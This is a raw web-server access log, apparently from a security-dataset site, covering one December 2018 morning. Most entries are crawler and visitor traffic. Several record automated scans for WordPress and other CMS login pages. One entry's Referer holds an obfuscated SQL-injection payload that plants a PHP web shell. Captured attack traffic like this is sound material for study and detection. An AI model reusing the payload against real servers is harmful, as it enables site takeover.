54.36.148.237 - - [02/Dec/2018:02:18:52 -0800] "GET /self.logs/error.log.2016-07-09.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
40.77.167.219 - - [02/Dec/2018:08:17:22 -0800] "GET /self.logs/access.log.2018-11-29.gz HTTP/1.1" 200 23288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.109 - - [02/Dec/2018:08:22:14 -0800] "GET /self.logs/2016/error.log.2016-08-28.gz HTTP/1.1" 200 573 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
40.77.167.219 - - [02/Dec/2018:08:22:23 -0800] "GET /self.logs/error.log.2018-11-29.gz HTTP/1.1" 200 4191 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.124 - - [02/Dec/2018:08:24:53 -0800] "GET /self.logs/access.log.2017-08-23.gz HTTP/1.1" 200 21138 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
199.58.86.211 - - [02/Dec/2018:08:25:39 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [02/Dec/2018:08:25:39 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [02/Dec/2018:08:25:41 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [02/Dec/2018:08:25:42 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
113.171.224.176 - - [02/Dec/2018:08:29:01 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
220.181.108.106 - - [02/Dec/2018:08:37:09 -0800] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.176 - - [02/Dec/2018:08:37:09 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.221 - - [02/Dec/2018:08:37:10 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.228 - - [02/Dec/2018:08:37:11 -0800] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.160 - - [02/Dec/2018:08:37:11 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.158 - - [02/Dec/2018:08:37:12 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.219 - - [02/Dec/2018:08:37:13 -0800] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.219 - - [02/Dec/2018:08:37:13 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
208.77.46.246 - - [02/Dec/2018:08:39:20 -0800] "GET //dede/login.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
192.17.11.142 - - [02/Dec/2018:08:40:30 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
192.17.11.142 - - [02/Dec/2018:08:40:31 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
192.17.11.142 - - [02/Dec/2018:08:40:31 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
192.17.11.142 - - [02/Dec/2018:08:40:31 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
40.77.167.68 - - [02/Dec/2018:08:40:46 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/app_stats.html HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.75 - - [02/Dec/2018:08:41:06 -0800] "GET /self.logs/error.log.2018-10-16.gz HTTP/1.1" 200 4073 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.58.1.116 - - [02/Dec/2018:08:45:21 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
54.36.148.159 - - [02/Dec/2018:08:45:22 -0800] "GET /self.logs/error.log.2018-08-03.gz HTTP/1.1" 200 6228 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
3.16.55.110 - - [02/Dec/2018:08:45:28 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
3.16.143.41 - - [02/Dec/2018:08:46:05 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
123.125.71.19 - - [02/Dec/2018:08:47:02 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.149.94 - - [02/Dec/2018:08:47:37 -0800] "GET /self.logs/error.log.2016-04-03.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
178.120.37.127 - - [02/Dec/2018:08:50:02 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36" 
178.120.37.127 - - [02/Dec/2018:08:50:03 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36" 
178.120.37.127 - - [02/Dec/2018:08:50:03 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36" 
178.120.37.127 - - [02/Dec/2018:08:50:04 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36" 
46.31.59.59 - - [02/Dec/2018:08:50:53 -0800] "GET / HTTP/1.1" 200 12470 "http://127.0.0.1:8888/notebooks/prog_datasci_5/prog_datasci_5_api.ipynb" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
46.31.59.59 - - [02/Dec/2018:08:50:56 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
46.31.59.59 - - [02/Dec/2018:08:50:56 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
46.31.59.59 - - [02/Dec/2018:08:51:03 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
208.77.46.246 - - [02/Dec/2018:08:53:11 -0800] "GET //user.php?act=login HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:576:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32787059573475634768774a79776e52306c474f446c6850443977614841674b4352694e47526962336b675053416b5831425055315262584364694e47526962336c634a3130704943596d49454277636d566e58334a6c634778685932556f58436376595751765a56776e4c46776e5146776e4c6e4e30636c3979623351784d7968634a334a70626e6c634a796b755843636f4a4749305a474a7665536c634a797767584364685a4752634a796b374944382b63336c7a6447567449475a706247556e4b513d3d2729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
208.77.46.246 - - [02/Dec/2018:08:53:12 -0800] "GET //lian.php HTTP/1.1" 404 294 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
82.165.80.54 - - [02/Dec/2018:08:55:26 -0800] "GET /wp-admin/ HTTP/1.1" 301 479 "-" "-" 
106.120.173.159 - - [02/Dec/2018:08:56:12 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279381 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [02/Dec/2018:08:56:35 -0800] "GET / HTTP/1.1" 304 152 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
162.210.196.129 - - [02/Dec/2018:09:01:19 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [02/Dec/2018:09:01:20 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
197.26.72.118 - - [02/Dec/2018:09:01:52 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
197.26.72.118 - - [02/Dec/2018:09:01:53 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
192.254.250.187 - - [02/Dec/2018:09:02:15 -0800] "GET /test/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
54.36.148.37 - - [02/Dec/2018:09:03:57 -0800] "GET /self.logs/2016/access.log.2016-07-04.gz HTTP/1.1" 200 10605 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.175 - - [02/Dec/2018:09:07:00 -0800] "GET /self.logs/2016/access.log.2016-04-07.gz HTTP/1.1" 200 8170 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
162.210.196.97 - - [02/Dec/2018:09:08:29 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [02/Dec/2018:09:08:31 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
198.38.82.78 - - [02/Dec/2018:09:08:57 -0800] "GET /wordpress/wp-admin/ HTTP/1.1" 301 499 "-" "-" 
40.77.167.68 - - [02/Dec/2018:09:09:46 -0800] "GET /self.logs/access.log.2017-10-04.gz HTTP/1.1" 200 32541 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
176.63.30.53 - - [02/Dec/2018:09:12:37 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
92.87.196.120 - - [02/Dec/2018:09:15:22 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
92.87.196.120 - - [02/Dec/2018:09:15:22 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
18.224.59.51 - - [02/Dec/2018:09:15:43 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
74.63.218.18 - - [02/Dec/2018:09:15:43 -0800] "GET /blog/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
52.15.50.98 - - [02/Dec/2018:09:16:30 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
13.59.168.244 - - [02/Dec/2018:09:16:56 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
184.168.193.26 - - [02/Dec/2018:09:22:47 -0800] "GET /wp/wp-admin/ HTTP/1.1" 301 485 "-" "-" 
77.127.64.38 - - [02/Dec/2018:09:23:26 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
77.127.64.38 - - [02/Dec/2018:09:23:27 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
123.125.71.115 - - [02/Dec/2018:09:29:34 -0800] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.112 - - [02/Dec/2018:09:29:35 -0800] "GET / HTTP/1.1" 304 152 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
93.123.73.215 - - [02/Dec/2018:09:29:37 -0800] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
207.46.13.172 - - [02/Dec/2018:09:30:57 -0800] "GET /self.logs/access.log.2017-06-30.gz HTTP/1.1" 200 51348 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [02/Dec/2018:09:31:51 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
66.249.80.63 - - [02/Dec/2018:09:32:03 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.80.32 - - [02/Dec/2018:09:32:03 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
113.247.16.7 - - [02/Dec/2018:09:32:31 -0800] "GET //plus/flink.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
41.223.160.138 - - [02/Dec/2018:09:36:14 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.67 - - [02/Dec/2018:09:36:54 -0800] "GET /self.logs/error.log.2015-07-07.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.17 - - [02/Dec/2018:09:37:24 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.17 - - [02/Dec/2018:09:37:24 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.68 - - [02/Dec/2018:09:37:33 -0800] "GET /self.logs/access.log.2017-04-15.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.81 - - [02/Dec/2018:09:38:17 -0800] "GET /self.logs/2016/access.log.2016-04-02.gz HTTP/1.1" 200 19966 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
91.109.197.242 - - [02/Dec/2018:09:38:32 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
91.109.197.242 - - [02/Dec/2018:09:38:32 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
40.77.167.64 - - [02/Dec/2018:09:40:50 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.138 - - [02/Dec/2018:09:41:06 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
31.130.19.254 - - [02/Dec/2018:09:43:44 -0800] "GET / HTTP/1.0" 200 46413 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36" 
13.58.1.116 - - [02/Dec/2018:09:44:46 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
123.231.122.37 - - [02/Dec/2018:09:44:59 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
3.17.28.84 - - [02/Dec/2018:09:45:47 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Safari/602.1" 
3.17.73.145 - - [02/Dec/2018:09:46:15 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
207.46.13.172 - - [02/Dec/2018:09:48:27 -0800] "GET /self.logs/access.log.2018-09-07.gz HTTP/1.1" 200 28003 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.68 - - [02/Dec/2018:10:04:21 -0800] "GET /self.logs/access.log.2017-09-18.gz HTTP/1.1" 200 30079 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.14.83.164 - - [02/Dec/2018:10:10:55 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
37.14.83.164 - - [02/Dec/2018:10:10:55 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
123.125.67.224 - - [02/Dec/2018:10:13:30 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.165 - - [02/Dec/2018:10:13:32 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.220 - - [02/Dec/2018:10:13:33 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
106.38.241.160 - - [02/Dec/2018:10:14:42 -0800] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [02/Dec/2018:10:14:47 -0800] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [02/Dec/2018:10:14:47 -0800] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
18.224.59.51 - - [02/Dec/2018:10:15:16 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
3.17.57.171 - - [02/Dec/2018:10:15:17 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
106.38.241.160 - - [02/Dec/2018:10:16:00 -0800] "GET / HTTP/1.1" 200 12433 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
18.221.165.26 - - [02/Dec/2018:10:16:52 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
40.77.167.64 - - [02/Dec/2018:10:27:51 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.245 - - [02/Dec/2018:10:27:56 -0800] "GET /self.logs/access.log.2015-11-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
47.145.101.2 - - [02/Dec/2018:10:29:25 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
85.154.148.233 - - [02/Dec/2018:10:36:58 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
207.46.13.192 - - [02/Dec/2018:10:38:07 -0800] "GET /self.logs/error.log.2016-07-17.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.99 - - [02/Dec/2018:10:40:32 -0800] "GET /self.logs/2016/access.log.2016-12-26.gz HTTP/1.1" 200 8842 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
113.247.16.7 - - [02/Dec/2018:10:45:02 -0800] "GET //plus/flink.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
18.218.1.84 - - [02/Dec/2018:10:45:15 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/42.0" 
3.16.1.42 - - [02/Dec/2018:10:47:24 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
207.46.13.192 - - [02/Dec/2018:10:47:34 -0800] "GET /self.logs/error.log.2016-11-01.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.58.26.87 - - [02/Dec/2018:10:48:15 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
199.58.86.211 - - [02/Dec/2018:10:49:02 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [02/Dec/2018:10:49:04 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
82.79.156.32 - - [02/Dec/2018:10:52:30 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
82.79.156.32 - - [02/Dec/2018:10:52:31 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.233 - - [02/Dec/2018:10:52:52 -0800] "GET /self.logs/access.log.2017-12-19.gz HTTP/1.1" 200 24157 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
199.58.86.211 - - [02/Dec/2018:10:52:58 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [02/Dec/2018:10:52:58 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
